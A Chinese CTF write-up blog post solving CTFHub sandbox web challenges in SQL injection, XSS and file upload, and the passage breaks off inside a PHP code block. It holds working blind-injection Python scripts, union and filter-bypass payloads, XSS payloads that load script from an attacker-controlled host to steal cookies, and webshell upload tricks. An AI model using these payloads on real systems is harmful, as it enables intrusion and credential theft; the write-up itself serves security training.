<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231219175252521.png" alt="image-20231219175252521"></p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231219175231504.png" alt="image-20231219175231504"></p>
<p>如上，页面只有两种回显，只能盲注，写脚本，二分法更快。或者sqlmap</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> time
<span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">'http://challenge-f1141910229dba2a.sandbox.ctfhub.com:10800/?id='</span>

flag <span class="token operator">=</span> <span class="token string">""</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    left <span class="token operator">=</span> <span class="token number">32</span>
    right <span class="token operator">=</span> <span class="token number">128</span>
    mid <span class="token operator">=</span> <span class="token punctuation">(</span>left <span class="token operator">+</span> right<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>
    <span class="token keyword">while</span> left <span class="token operator">&lt;</span> right<span class="token punctuation">:</span>
        payload <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f"1 and if(ascii(substr((select flag from flag),</span><span class="token interpolation"><span class="token punctuation">{</span>i<span class="token punctuation">}</span></span><span class="token string">,1))&gt;</span><span class="token interpolation"><span class="token punctuation">{</span>mid<span class="token punctuation">}</span></span><span class="token string">,sleep(2),0)#"</span></span>
        start_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">.</span>text
        end_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
        use_time <span class="token operator">=</span> end_time <span class="token operator">-</span> start_time

        <span class="token keyword">if</span> use_time <span class="token operator">&gt;</span> <span class="token number">2</span><span class="token punctuation">:</span>
            left <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            right <span class="token operator">=</span> mid
        mid <span class="token operator">=</span> <span class="token punctuation">(</span>left <span class="token operator">+</span> right<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span>
    flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231219180027132.png" alt="image-20231219180027132"></p>
<h3 id="时间盲注">时间盲注</h3>
<pre class="line-numbers language-http" data-language="http"><code class="language-http">?id=1 and sleep(1)
?id=1 and sleep(5)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>简单测试一下发现页面回显有所延迟，确定为时间盲注。上脚本或者，sqlmap</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> time
<span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">'http://challenge-3252dd76021b94e3.sandbox.ctfhub.com:10800/?id='</span>
flag <span class="token operator">=</span> <span class="token string">""</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    left <span class="token operator">=</span> <span class="token number">32</span>
    right <span class="token operator">=</span> <span class="token number">128</span>
    mid <span class="token operator">=</span> <span class="token punctuation">(</span>left <span class="token operator">+</span> right<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>
    <span class="token keyword">while</span> left <span class="token operator">&lt;</span> right<span class="token punctuation">:</span>
        payload <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f"1 and if(ascii(substr((select flag from flag),</span><span class="token interpolation"><span class="token punctuation">{</span>i<span class="token punctuation">}</span></span><span class="token string">,1))&gt;</span><span class="token interpolation"><span class="token punctuation">{</span>mid<span class="token punctuation">}</span></span><span class="token string">,sleep(2),0)#"</span></span>
        start_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">.</span>text
        end_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
        use_time <span class="token operator">=</span> end_time <span class="token operator">-</span> start_time

        <span class="token keyword">if</span> use_time <span class="token operator">&gt;</span> <span class="token number">2</span><span class="token punctuation">:</span>
            left <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            right <span class="token operator">=</span> mid
        mid <span class="token operator">=</span> <span class="token punctuation">(</span>left <span class="token operator">+</span> right<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>

    <span class="token comment">#print(mid)</span>
    flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"flag:"</span><span class="token punctuation">,</span> flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="MySQL结构">MySQL结构</h3>
<p>这道题也不知道什么含义，考点和整数型注入似乎是一样的，只不过换了些名字，过程不赘述了，直接给结果</p>
<pre class="line-numbers language-none"><code class="language-none">?id=-1 union select 1,oifqtgzzzi from cjpyvsldua<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231219181316085.png" alt="image-20231219181316085"></p>
<h3 id="Cookie注入">Cookie注入</h3>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231219191336883.png" alt="image-20231219191336883"></p>
<p>提示我们在cookie处</p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231219191415075.png" alt="image-20231219191415075"></p>
<p>如上图，成功爆库，接下来爆表</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http">id=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231219191527988.png" alt="image-20231219191527988"></p>
<p>爆列名</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http">id=-1 union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='asdlhojeyd'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231219191623662.png" alt="image-20231219191623662"></p>
<p>爆数据</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http">id=-1 union select 1,tbslnjukkx from asdlhojeyd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231219191716003.png" alt="image-20231219191716003"></p>
<h3 id="UA注入">UA注入</h3>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231219192046271.png" alt="image-20231219192046271"></p>
<p>看数据就知道注入点在UA头处，直接修改即可，步骤同上，不再赘述</p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231219192208158.png" alt="image-20231219192208158"></p>
<h3 id="Referer注入">Referer注入</h3>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231219193020704.png" alt="image-20231219193020704"></p>
<p>直接在referer头处输入SQL语句即可，不再赘述</p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231219193137036.png" alt="image-20231219193137036"></p>
<h3 id="过滤空格">过滤空格</h3>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231219195035851.png" alt="image-20231219195035851"></p>
<p>题目说了过滤空格，直接采用%0a或者内联注释符绕过即可</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http">?id=-1/**/union/**/select/**/1,zfbvfsfjmz/**/from/**/lyvloeyoue<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231219195214490.png" alt="image-20231219195214490"></p>
<h2 id="XSS">XSS</h2>
<h3 id="XSS-反射型">XSS-反射型</h3>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231221155028167.png" alt="image-20231221155028167"></p>
<p>题目说是反射型，我们先简单测试一下</p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231221155111294.png" alt="image-20231221155111294"></p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231221155107898.png" alt="image-20231221155107898"></p>
<p>的确存在，而且没有过滤，那我们分析一下下面的Bot的含义，我们都知道如果网站存在xss的话，其危害通常来说就是获取其他用户甚至是管理员的cookie，密码等等信息，那我们输入恶意xss代码，肯定需要有人去访问或者点击，这样的话我们才能获得他们cookie等信息，而下面的Bot就是存在一个机器人去模仿别的用户或者管理员去点击我们的恶意xss代码，从而我们可以得到其cookie。</p>
<p>那接下来就需要我们的xssplatform了，毕竟bot点击之后只会显示success，其cookie我们无法得知，需要通过xss平台来获取cookie。建议是自己用vps搭一个平台，这里我已经搭建好，随后建一个项目，配置默认即可。</p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231221155625464.png" alt="image-20231221155625464"></p>
<p>随便复制一个，先提交至上面的输入框</p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231221155656804.png" alt="image-20231221155656804"></p>
<p>接下来将得到的url传到下面的bot让其自动点击</p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231221155727242.png" alt="image-20231221155727242"></p>
<p>页面显示success之后我们到xss后台就可以看到cookie信息了</p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231221155812545.png" alt="image-20231221155812545"></p>
<h3 id="XSS-存储型">XSS-存储型</h3>
<p>这里同样将上述的xss代码传入上面的输入框，传入之后这个恶意代码就被存入了对方的（受害者）服务器中，随后将靶场地址输入到下面的bot中，其后每当bot访问该网址，就相当于执行一次我们恶意代码，我们只需要在xss平台就可以获得cookie</p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231221160549747.png" alt="image-20231221160549747"></p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231221160515089.png" alt="image-20231221160515089"></p>
<h3 id="XSS-DOM反射">XSS-DOM反射</h3>
<p>DOM反射说白了，就是审计前端的js代码，这种xss是反射型的变种，他不需要去服务器端进行交互，直接就在前端将插入的js代码渲染了，也就是这完全是客户端的事情。</p>
<p>所以遇到这种反射，我们通常需要考虑如何闭合其代码，从而将我们的恶意js代码得到执行</p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231221161953167.png" alt="image-20231221161953167"></p>
<p>这里我们简单测试发现我们输入的内容插入到了这个innerHTML中，但由于其被当成了字符串，所以这个恶意js代码无法执行，因此我们需要考虑闭合。倘若我们构造下列payload：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token string">';&lt;/script&gt;&lt;script&gt;alert('</span>hacker'<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span class="token comment">//</span>
<span class="token comment">//这样的话我们就将前面的script标签进行了闭合,后续通过//进行注释,我们的js代码得以成功执行</span>
<span class="token comment">//接下来将上列payload替换为我们xss平台的代码即可,最后将得到的url提交给bot让其点击,观察平台响应即可</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231221161746779.png" alt="image-20231221161746779"></p>
<p>成功拿到flag</p>
<h3 id="XSS-DOM跳转">XSS-DOM跳转</h3>
<p>这里也是有点蒙蔽，就看wp了</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">&gt;</span>
    	<span class="token comment">//获取了当前页面的URL查询部分（即location.search）</span>
        <span class="token keyword">var</span> target <span class="token operator">=</span> location<span class="token punctuation">.</span>search<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"="</span><span class="token punctuation">)</span>
<span class="token comment">//然后使用split("=")方法将查询参数分割成数组。这将导致target变量包含一个数组，其中第一个元素是查询参数名，第二个元素是查询参数值。</span>
		<span class="token comment">//它检查数组的第一个元素的剥离后是否等于字符串"jumpto"</span>
		<span class="token comment">//slice(1)是用来去掉参数名前面的问号字符("?")的</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>target<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"jumpto"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token comment">//将页面的location.href属性设置为查询参数的值，从而导致页面重定向到该值所指定的URL。</span>
            location<span class="token punctuation">.</span>href <span class="token operator">=</span> target<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里是漏洞点，可见这里我们需要get传一个<code>jumpto</code>的参数，并在=后面附上我们的恶意js代码，但此处我并不清楚如何添加，看了wp发现是知识盲区：</p>
<p>注意！当你将类似于 location.href = “javascript:alert(‘xss’)” 这样的代码赋值给 location.href 时，浏览器会将其解释为一种特殊的URL方案，即 “javascript:”。在这种情况下，浏览器会将后面的 JavaScript 代码作为URL的一部分进行解析，然后执行它。</p>
<p>所以有如下payload：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token literal-property property">http</span><span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>challenge<span class="token operator">-</span>a0657aa32a9d9134<span class="token punctuation">.</span>sandbox<span class="token punctuation">.</span>ctfhub<span class="token punctuation">.</span>com<span class="token operator">:</span><span class="token number">10800</span><span class="token operator">/</span><span class="token operator">?</span>jumpto<span class="token operator">=</span>javascript<span class="token operator">:</span>$<span class="token punctuation">.</span><span class="token function">getScript</span><span class="token punctuation">(</span><span class="token string">"//ip:9999//9GXMk4"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>这段代码使用了 jQuery 的 <code>$.getScript()</code> 函数来异步加载并执行来自 xss平台 的 js 脚本，使用前提是网站引用了jQuery。</p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231221163932085.png" alt="image-20231221163932085"></p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231221163853220.png" alt="image-20231221163853220"></p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231221163840285.png" alt="image-20231221163840285"></p>
<p>拿到flag</p>
<h3 id="XSS-过滤空格">XSS-过滤空格</h3>
<p>简单测试一下知道过滤了空格，查询一番可以知道通过/**/或者/符号即可绕过，原始payload如下：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span><span class="token operator">/</span>textarea<span class="token operator">&gt;</span>'"<span class="token operator">&gt;</span><span class="token operator">&lt;</span>script src<span class="token operator">=</span>http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>ip<span class="token operator">:</span><span class="token number">9999</span><span class="token operator">/</span>9GXMk4<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>修改如下：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span><span class="token operator">/</span>textarea<span class="token operator">&gt;</span>'"<span class="token operator">&gt;</span><span class="token operator">&lt;</span>script<span class="token operator">/</span>src<span class="token operator">=</span>http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>ip<span class="token operator">:</span><span class="token number">9999</span><span class="token operator">/</span>9GXMk4<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>之后老办法即可</p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231221165025048.png" alt="image-20231221165025048"></p>
<h3 id="XSS-过滤关键词">XSS-过滤关键词</h3>
<p>简单测试知道过滤了script关键词，尝试双写成功绕过。</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span><span class="token operator">/</span>textarea<span class="token operator">&gt;</span>'"<span class="token operator">&gt;</span><span class="token operator">&lt;</span>scriscriptpt<span class="token operator">/</span>src<span class="token operator">=</span>http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>ip<span class="token operator">:</span><span class="token number">9999</span><span class="token operator">/</span>9GXMk4<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>scriscriptpt<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="文件上传">文件上传</h2>
<h3 id="无验证">无验证</h3>
<p>题目说没有过滤，直接传入一句话上传即可，如下图，文件上传路径也得知了，直接访问。</p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231222140155631.png" alt="image-20231222140155631"></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token number">1</span><span class="token operator">=</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'cat /var/www/html/flag_1916225392.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231222140558101.png" alt="image-20231222140558101"></p>
<h3 id="前端验证">前端验证</h3>
<p>这里上传php后缀文件会发现被前端的js禁止了，那我们修改后缀为其指定的，随后抓包修改即可</p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231222140941551.png" alt="image-20231222140941551"></p>
<p>成功上传</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token number">1</span><span class="token operator">=</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'cat /var/www/html/flag_985418763.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231222141056675.png" alt="image-20231222141056675"></p>
<h3 id="htaccess">.htaccess</h3>
<p>htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能</p>
<p>如果我们用上一关的思路会发现行不通，其在后端进行了后缀名的验证</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'extension'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"php7"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"php5"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"php4"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"php3"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"phtml"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"pht"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"jsp"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"jspa"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"jspx"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"jsw"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"jsv"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"jspf"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"jtml"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"asp"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"aspx"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"asa"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"asax"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"ascx"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"ashx"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"asmx"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"cer"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"swf"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$ext</span><span class="token punctuation">,</span> <span class="token variable">$blacklist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token constant">UPLOAD_PATH</span> <span class="token operator">.</span> <span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script&gt;alert('上传成功')&lt;/script&gt;"</span><span class="token punctuation">;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"上传文件相对路径&lt;br&gt;"</span> <span class="token operator">.</span> <span class="token constant">UPLOAD_URL_PATH</span> <span class="token operator">.</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script&gt;alert('上传失败')&lt;/script&gt;"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script&gt;alert('文件类型不匹配')&lt;/script&gt;"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>我们可以看到上述过滤的后缀很多，但是没有过滤.htaccess，那我们上传即可，内容如下</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">AddType application<span class="token operator">/</span>x<span class="token operator">-</span>httpd<span class="token operator">-</span>php <span class="token operator">.</span>bcx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>这意味着如果我们上传后缀名为.bcx的文件，其服务器会将其内容按照php解析。</p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231222141700371.png" alt="image-20231222141700371"></p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231222141731681.png" alt="image-20231222141731681"></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token number">1</span><span class="token operator">=</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'cat /var/www/html/flag_2427815270.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231222141816824.png" alt="image-20231222141816824"></p>
<h3 id="MIME绕过">MIME绕过</h3>
<p>这里进行了MIME类型的检测</p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231222142002557.png" alt="image-20231222142002557"></p>
<p>我们直接修改Content-Type即可</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token number">1</span><span class="token operator">=</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'cat /var/www/html/flag_324517797.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231222142110464.png" alt="image-20231222142110464"></p>
<h3 id="文件头检查">文件头检查</h3>
<p>这里限制了文件头也就是不能&lt;?php开头了，那我们以GIF89a开头即可</p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231222142332612.png" alt="image-20231222142332612"></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token number">1</span><span class="token operator">=</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'cat /var/www/html/flag_31822842.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231222142435043.png" alt="image-20231222142435043"></p>
<h3 id="00截断">00截断</h3>
<p>这里题目说是利用00截断，原理就是空字符在C语言中会被当做字符串结束的标志，而php底层是C实现的，那也就是说php也可以用00来代表截断，不过此方法有PHP版本限制</p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231222143107989.png" alt="image-20231222143107989"></p>
<p>我们随便上传个文件抓包可以看到如下图，这里增加了一个参数导致我们可以随意控制文件上传路径，那我们直接在路径后面做出如下修改</p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231222143014229.png" alt="image-20231222143014229"></p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231222143243099.png" alt="image-20231222143243099"></p>
<p>这里注意空字符用%00代替，随后直接上传即可，这里如果我们的文件名为1.jpg之类的，那上传后为<code>shell.php%001.jpg</code>这里上传至服务器之后，它会将后面的1.jpg忽略，从而我们可以绕过。</p>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231222143453476.png" alt="image-20231222143453476"></p>
<h3 id="双写后缀">双写后缀</h3>
<p><img src="/2023/12/12/ctfhub-xi-lie/image-20231222143857725.png" alt="image-20231222143857725"></p>
<p>这里上传看了一下发现后缀php被替换为空了，但下面给了我们提示代码</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"php5"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"php4"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"php3"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"phtml"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"pht"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"jsp"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"jspa"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"jspx"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"jsw"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"jsv"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"jspf"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"jtml"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"asp"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"aspx"</span><span class="token punctuation">,</span> <span 